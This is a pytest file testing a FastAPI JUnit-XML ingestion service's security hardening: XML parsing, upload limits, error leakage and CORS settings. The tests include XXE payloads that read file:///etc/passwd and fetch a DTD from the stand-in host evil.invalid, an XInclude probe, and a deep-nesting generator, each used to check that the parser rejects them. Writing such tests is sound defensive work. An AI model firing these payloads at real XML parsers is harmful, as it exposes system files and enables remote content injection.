"""Phase 13 tests: malicious XML, upload hardening, CORS, error safety."""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.core.config import get_settings
from app.db.base import Base
from app.db.session import get_db
from app.ingestion.parser import JUnitParseError, parse_junit
from app.main import create_app

EXTERNAL_FILE_ENTITY = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE testsuite [<!ENTITY secret SYSTEM "file:///etc/passwd">]>'
    b'<testsuite><testcase classname="a" name="t" time="0.1">&secret;</testcase></testsuite>'
)

EXTERNAL_PARAM_ENTITY = (
    b'<?xml version="1.0"?>'
    b'<!DOCTYPE testsuite [<!ENTITY % remote SYSTEM "http://evil.invalid/x.dtd"> %remote;]>'
    b'<testsuite><testcase classname="a" name="t" time="0.1"/></testsuite>'
)

XINCLUDE_PROBE = (
    b'<?xml version="1.0"?>'
    b'<testsuite xmlns:xi="http://www.w3.org/2001/XInclude">'
    b'<xi:include href="file:///etc/passwd" parse="text"/>'
    b'<testcase classname="a" name="t" time="0.1"/>'
    b"</testsuite>"
)


def _deep_nesting(depth: int = 5000) -> bytes:
    return b"<testsuite>" * depth + b"<testcase classname='a' name='t'/>" + b"</testsuite>" * depth


def test_rejects_external_entities():
    with pytest.raises(JUnitParseError, match="unsafe"):
        parse_junit(EXTERNAL_FILE_ENTITY)
    with pytest.raises(JUnitParseError, match="unsafe"):
        parse_junit(EXTERNAL_PARAM_ENTITY)


def test_xinclude_is_never_resolved():
    parsed = parse_junit(XINCLUDE_PROBE)
    assert len(parsed.cases) == 1
    assert parsed.cases[0].test_name == "t"


def test_rejects_pathological_nesting_without_crashing():
    with pytest.raises(JUnitParseError):
        parse_junit(_deep_nesting())


def test_truncates_huge_failure_text_and_type():
    blob = "A" * 9000
    xml = (
        f'<testsuite name="s"><testcase classname="a" name="t" time="0.1">'
        f'<failure type="{"T" * 400}">{blob}</failure>'
        f"</testcase></testsuite>"
    ).encode()
    parsed = parse_junit(xml)
    assert parsed.cases[0].failure_message is not None
    assert len(parsed.cases[0].failure_message) <= 4000 + len("…[truncated]")
    assert parsed.cases[0].failure_message.endswith("…[truncated]")
    assert parsed.cases[0].failure_type is not None
    assert len(parsed.cases[0].failure_type) <= 255


def test_rejects_overlong_identity_fields():
    long_name = "n" * 2000
    with pytest.raises(JUnitParseError, match="1024"):
        parse_junit(
            f'<testsuite name="s"><testcase classname="a" name="{long_name}"/></testsuite>'.encode()
        )
    with pytest.raises(JUnitParseError, match="255"):
        parse_junit(
            f'<testsuite name="{"s" * 300}"><testcase classname="a" name="t"/></testsuite>'.encode()
        )


@pytest.fixture()
def client():
    engine = create_engine(
        "sqlite://",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine, expire_on_commit=False)

    def override():
        session = factory()
        try:
            yield session
        finally:
            session.close()

    app = create_app()
    app.dependency_overrides[get_db] = override
    return TestClient(app)


def _upload(client: TestClient, payload: bytes, **data):
    fields = {"project": "sec", "run_number": "1"}
    fields.update(data)
    return client.post(
        "/api/runs/upload",
        files={"file": ("results.xml", payload, "text/xml")},
        data=fields,
    )


def test_upload_rejects_overlong_metadata(client: TestClient):
    xml = b'<testsuite name="s"><testcase classname="a" name="t" time="0.1"/></testsuite>'
    response = _upload(client, xml, project="p" * 300, run_number="2")
    assert response.status_code == 400
    assert response.json()["error"] == "VALIDATION_ERROR"

    bad_branch = _upload(client, xml, project="sec", run_number="3", branch="b" * 300)
    assert bad_branch.status_code == 400


def test_error_responses_leak_nothing(client: TestClient):
    for response in (
        client.get("/api/tests/99999"),
        client.get("/api/runs/99999"),
        client.get("/api/projects/99999"),
        _upload(client, b"<broken", run_number="9"),
    ):
        body = response.text
        assert "Traceback" not in body
        assert "psycopg" not in body
        assert "postgres://" not in body
        assert "request_id" in body


def test_health_exposes_no_configuration(client: TestClient):
    assert client.get("/health").json() == {"status": "ok"}


def test_cors_origins_env_parsing(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("CORS_ORIGINS", "http://a.test,http://b.test")
    get_settings.cache_clear()
    try:
        assert get_settings().cors_origins == ["http://a.test", "http://b.test"]
    finally:
        monkeypatch.undo()
        get_settings.cache_clear()
    assert get_settings().cors_origins == ["http://localhost:5173"]
